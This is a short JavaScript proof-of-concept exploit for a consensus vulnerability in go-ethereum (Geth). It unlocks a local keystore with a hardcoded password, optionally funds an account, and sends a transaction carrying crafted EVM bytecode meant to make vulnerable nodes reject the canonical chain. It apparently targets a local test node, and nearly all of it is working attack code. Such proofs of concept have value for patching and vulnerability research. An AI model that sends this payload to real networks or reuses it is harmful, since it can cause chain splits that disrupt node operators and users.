/**
 * go-ethereum is the official Go implementation of the Ethereum protocol.
 * In affected versions a consensus-vulnerability in go-ethereum (Geth) could cause a chain split,
 * where vulnerable versions refuse to accept the canonical chain.
 */
const Web3 = require('web3');
const fs = require("fs");
const keythereum = require("keythereum");
const web3 = new Web3('http://localhost:8548');

//Get private key of node 1
const PASSWORD = "helloworld";
const KEYSTORE = `${__dirname}/node1_keystore.json`;
const keyObject = JSON.parse(fs.readFileSync(KEYSTORE, {encoding: "utf8"}));
const privateKey = keythereum.recover(PASSWORD, keyObject).toString("hex");
/**
 * This address should already be pre-funded with Wei, but if not, execute firstSendEth(ADDRESS_WITH_WEI)
 * @type {string}
 */
const MAIN_ADDR = '0x'+keyObject.address;

//First send 1 eth to testing account
async function firstSendEth(from) {
    const nonce = await web3.eth.getTransactionCount("0x2dd4aea78a11ab6efce6d7bdfdd5e2a82e9a09d9");

    const createTransaction = await web3.eth.accounts.signTransaction(
        {
            from: "0x2dd4aea78a11ab6efce6d7bdfdd5e2a82e9a09d9",
            to: "0x40AbF06EEDA3E3ba2a43a2EF1FB9b8d4fF745e37",
            value: web3.utils.toWei('3000', 'ether'),
            gas: "21000",
            nonce
        },
        privateKey
    );
    const receipt = await web3.eth.sendSignedTransaction(createTransaction.rawTransaction);
    console.log(nonce, "address:", MAIN_ADDR, "been credited, tx_hash:", receipt.transactionHash);
}

//sanity check, assert testing account has balance
async function assertBalanceAvailable() {
    const raw_bal = await web3.eth.getBalance(MAIN_ADDR);
    const bal = web3.utils.fromWei(raw_bal,'ether');
    return bal !== '0';
}

async function createAttackTx() {
    let nonce = await web3.eth.getTransactionCount(MAIN_ADDR);

    const createTransaction = await web3.eth.accounts.signTransaction(
            {
                from: MAIN_ADDR,
                gas: "402480",
                nonce,
                data: "0x6001600053600260015360036002536004600353600560045360066" +
                    "005536006600260066000600060047f7ef0367e" +
                    "633852132a0ebbf70eb714015dd44bc82e1e55a96ef1389" +
                    "c999c1bcaf13d600060003e596000208055"
            },
            privateKey
        );
    console.log(nonce, "created");
    const receipt = await web3.eth.sendSignedTransaction(createTransaction.rawTransaction);
    console.log(nonce, "success, hash:", receipt.transactionHash);
}

async function main() {
    const notZero = await assertBalanceAvailable();
    if (notZero) {
        await createAttackTx();
        return 0;
    }
    else {
        // replace ADDRESS_WITH_BALANCE with an address with a balance
        await firstSendEth("ADDRESS_WITH_BALANCE");
        await createAttackTx();
        return 0;
    }
}
main();
